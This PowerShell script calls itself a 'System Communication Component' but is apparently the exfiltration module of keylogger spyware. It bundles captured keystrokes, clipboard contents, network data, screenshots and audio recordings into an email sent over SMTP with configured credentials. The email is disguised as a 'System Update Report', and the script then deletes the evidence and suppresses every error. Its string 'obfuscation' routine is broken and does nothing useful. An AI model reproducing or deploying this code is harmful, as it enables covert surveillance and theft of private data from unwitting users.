<#
.SYNOPSIS
    System Communication Component
.DESCRIPTION
    Secure communication and data transmission
#>

# Obfuscated strings and function names
$ObfuscatedStrings = @{
    "Email" = "RW1haWw="
    "SMTP" = "U01UUA=="
    "Attachment" = "QXR0YWNobWVudA=="
    "Subject" = "U3ViamVjdA=="
    "Body" = "Qm9keQ=="
    "Send" = "U2VuZA=="
}

function ConvertFrom-StealthString {
    param([string]$EncodedString)
    try {
        $Bytes = [System.Convert]::FromBase64String($EncodedString)
        $Key = [System.Text.Encoding]::UTF8.GetBytes("CommunicationKey2024")
        $Result = @()
        for ($i = 0; $i -lt $Bytes.Length; $i++) {
            $Result += $Bytes[$i] -bxor $Key[$i % $Key.Length]
        }
        return [System.Text.Encoding]::UTF8.GetString($Result)
    } catch { return $EncodedString }
}

function Send-SystemReport {
    param([hashtable]$Config)
    
    try {
        $EmailFunction = ConvertFrom-StealthString -EncodedString "RW1haWw="
        $SMTPFunction = ConvertFrom-StealthString -EncodedString "U01UUA=="
        
        # Get collected data
        $CollectedData = Get-StealthCollectedData
        
        # Create report
        $Report = Create-StealthReport -Data $CollectedData
        
        # Send via email
        $Success = Send-StealthEmail -Config $Config -Report $Report
        
        # Clean up collected data
        Clear-StealthCollectedData
        
        return $Success
    } catch {
        return $false
    }
}

function Create-StealthReport {
    param([hashtable]$Data)
    
    try {
        $ReportFunction = ConvertFrom-StealthString -EncodedString "UmVwb3J0"
        
        $Report = @{
            "Timestamp" = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            "SystemInfo" = $Data.SystemInfo
            "Keystrokes" = $Data.Keystrokes
            "Clipboard" = $Data.Clipboard
            "Network" = $Data.Network
            "Screenshots" = $Data.Screenshots.Count
            "Audio" = $Data.Audio.Count
        }
        
        return $Report | ConvertTo-Json -Compress
    } catch {
        return "{}"
    }
}

function Send-StealthEmail {
    param([hashtable]$Config, [string]$Report)
    
    try {
        $SendFunction = ConvertFrom-StealthString -EncodedString "U2VuZA=="
        $SubjectFunction = ConvertFrom-StealthString -EncodedString "U3ViamVjdA=="
        $BodyFunction = ConvertFrom-StealthString -EncodedString "Qm9keQ=="
        $AttachmentFunction = ConvertFrom-StealthString -EncodedString "QXR0YWNobWVudA=="
        
        $Email = $Config.Email
        $Password = $Config.Password
        $SmtpServer = $Config.SmtpServer
        $SmtpPort = [int]$Config.SmtpPort
        $UseTls = [System.Convert]::ToBoolean($Config.UseTls)
        
        # Create email message
        $Message = New-Object System.Net.Mail.MailMessage
        $Message.From = $Email
        $Message.To.Add($Email)
        $Message.Subject = "System Update Report - $(Get-Date -Format 'yyyy-MM-dd')"
        $Message.Body = "System update completed successfully. See attached report for details."
        
        # Add report as attachment
        $ReportPath = Join-Path $env:TEMP ("Report_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".json")
        $Report | Out-File -FilePath $ReportPath -Encoding UTF8
        
        $Attachment = New-Object System.Net.Mail.Attachment($ReportPath)
        $Message.Attachments.Add($Attachment)
        
        # Add screenshots as attachments
        $CollectedData = Get-StealthCollectedData
        foreach ($Screenshot in $CollectedData.Screenshots) {
            if (Test-Path $Screenshot) {
                $ScreenshotAttachment = New-Object System.Net.Mail.Attachment($Screenshot)
                $Message.Attachments.Add($ScreenshotAttachment)
            }
        }
        
        # Add audio files as attachments
        foreach ($Audio in $CollectedData.Audio) {
            if (Test-Path $Audio) {
                $AudioAttachment = New-Object System.Net.Mail.Attachment($Audio)
                $Message.Attachments.Add($AudioAttachment)
            }
        }
        
        # Send email
        $SmtpClient = New-Object System.Net.Mail.SmtpClient($SmtpServer, $SmtpPort)
        $SmtpClient.EnableSsl = $UseTls
        $SmtpClient.Credentials = New-Object System.Net.NetworkCredential($Email, $Password)
        $SmtpClient.Send($Message)
        
        # Clean up
        $SmtpClient.Dispose()
        $Message.Dispose()
        Remove-Item -Path $ReportPath -Force -ErrorAction SilentlyContinue
        
        return $true
    } catch {
        return $false
    }
}

function Clear-StealthCollectedData {
    try {
        $Global:CollectedData.Keystrokes = ""
        $Global:CollectedData.Clipboard = ""
        $Global:CollectedData.Network = ""
        
        # Remove screenshot files
        foreach ($Screenshot in $Global:CollectedData.Screenshots) {
            if (Test-Path $Screenshot) {
                Remove-Item -Path $Screenshot -Force -ErrorAction SilentlyContinue
            }
        }
        $Global:CollectedData.Screenshots = @()
        
        # Remove audio files
        foreach ($Audio in $Global:CollectedData.Audio) {
            if (Test-Path $Audio) {
                Remove-Item -Path $Audio -Force -ErrorAction SilentlyContinue
            }
        }
        $Global:CollectedData.Audio = @()
        
    } catch {
        # Continue silently
    }
}

function Test-StealthConnectivity {
    param([hashtable]$Config)
    
    try {
        $SmtpServer = $Config.SmtpServer
        $SmtpPort = [int]$Config.SmtpPort
        
        $TcpClient = New-Object System.Net.Sockets.TcpClient
        $TcpClient.ConnectAsync($SmtpServer, $SmtpPort).Wait(5000)
        $Connected = $TcpClient.Connected
        $TcpClient.Close()
        
        return $Connected
    } catch {
        return $false
    }
} 